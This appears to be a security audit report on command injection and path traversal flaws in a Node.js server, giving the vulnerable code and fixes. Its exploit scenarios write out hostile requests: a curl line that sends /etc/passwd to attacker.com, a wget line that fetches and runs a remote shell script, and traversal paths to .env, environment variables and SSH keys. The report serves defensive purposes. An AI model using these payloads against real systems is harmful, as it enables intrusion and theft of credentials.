# Vuln 1: OS Command Injection (RCE): `src/index.js:29`

* **Severity:** High
* **Category:** `command_injection`
* **Confidence:** 10/10

**Description:** The `host` query parameter from an unauthenticated GET request is interpolated directly into a shell command string passed to `child_process.exec()`. `exec()` invokes `/bin/sh -c`, meaning all shell metacharacters (`;`, `&&`, `|`, `$()`, backtick) are interpreted by the shell.

```javascript
// src/index.js — committed in f971230
} else if (req.method === 'GET' && url.pathname === '/api/ping') {
  const host = url.searchParams.get('host');
  exec(`ping -c 1 ${host}`, (err, stdout) => {   // ← host is attacker-controlled
    res.writeHead(200);
    res.end(JSON.stringify({ output: stdout }));
  });
}
```

**Exploit Scenario:** A single unauthenticated HTTP request achieves arbitrary OS command execution:

```
GET /api/ping?host=127.0.0.1;curl+http://attacker.com/$(cat+/etc/passwd|base64)
GET /api/ping?host=127.0.0.1;wget+http://attacker.com/shell.sh+-O+/tmp/s;bash+/tmp/s
```

No special privileges, credentials, or network position required. Attacker achieves RCE running as the Node.js process user.

**Recommendation:** Replace `exec` with `execFile`, which does not invoke a shell and passes arguments as a safe array. Validate `host` against a strict allowlist before use:

```javascript
const { execFile } = require('child_process');
const VALID_HOST = /^[a-zA-Z0-9.\-]{1,253}$/;

if (!VALID_HOST.test(host)) {
  res.writeHead(400);
  return res.end(JSON.stringify({ error: 'Invalid host' }));
}
execFile('ping', ['-c', '1', host], (err, stdout) => {
  res.writeHead(200);
  res.end(JSON.stringify({ output: stdout }));
});
```

# Vuln 2: Path Traversal / Arbitrary File Read: `src/index.js:34`

* **Severity:** High
* **Category:** `path_traversal`
* **Confidence:** 10/10

**Description:** The `file` query parameter from an unauthenticated GET request is passed to `path.join(__dirname, file)` and then directly to `fs.readFileSync()`. `path.join()` normalizes `..` sequences but does **not** constrain the result to remain under the base directory — it simply resolves the path. The full file contents are returned verbatim in the HTTP response.

```javascript
// src/index.js — committed in f971230
} else if (req.method === 'GET' && url.pathname === '/api/file') {
  const file = url.searchParams.get('file');
  const filePath = path.join(__dirname, file);       // ← traversal not prevented
  const contents = fs.readFileSync(filePath, 'utf8'); // ← no prefix guard
  res.writeHead(200);
  res.end(JSON.stringify({ contents }));
}
```

`path.join('/app/src', '../../../../../../etc/passwd')` resolves to `/etc/passwd`.

**Exploit Scenario:** Any file readable by the Node.js process can be exfiltrated with no authentication:

```
GET /api/file?file=../../../../../../etc/passwd
GET /api/file?file=../../../.env
GET /api/file?file=../../../../../../proc/self/environ
GET /api/file?file=../../../../../../home/ubuntu/.ssh/id_rsa
```

**Recommendation:** Use `path.resolve()` and assert the resolved path starts with the intended base directory before reading. Wrap in try/catch (the synchronous `readFileSync` will crash the server on missing/unreadable files):

```javascript
const BASE_DIR = path.resolve(__dirname, 'public'); // only serve files from here

const filePath = path.resolve(BASE_DIR, file);
if (!filePath.startsWith(BASE_DIR + path.sep)) {
  res.writeHead(403);
  return res.end(JSON.stringify({ error: 'Access denied' }));
}
try {
  const contents = fs.readFileSync(filePath, 'utf8');
  res.writeHead(200);
  res.end(JSON.stringify({ contents }));
} catch {
  res.writeHead(404);
  res.end(JSON.stringify({ error: 'File not found' }));
}
```
